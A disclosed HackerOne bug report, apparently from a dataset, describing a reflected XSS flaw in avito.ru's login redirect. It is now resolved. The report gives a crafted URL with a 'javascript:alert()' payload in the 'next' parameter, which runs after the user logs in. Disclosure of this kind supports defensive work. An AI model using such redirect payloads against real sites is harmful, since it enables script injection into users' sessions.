---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '344429'
original_report_id: '344429'
title: reflected XSS avito.ru
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: avito
created_at: '2018-04-29T17:35:44.327Z'
disclosed_at: '2018-12-06T09:45:27.785Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 20
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# reflected XSS avito.ru

## Metadata

- HackerOne Report ID: 344429
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: avito
- Disclosed At: 2018-12-06T09:45:27.785Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Привет, авито) 

Я нашел у вас хсс.

1. Переходим по этой ссылке https://www.avito.ru/sankt-peterburg?verifyUserLocation=1#login?next=javascript:alert();//
2. Логинимся через ОК, ВК и т.д.
3. XSS выполнена.

## Impact

XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
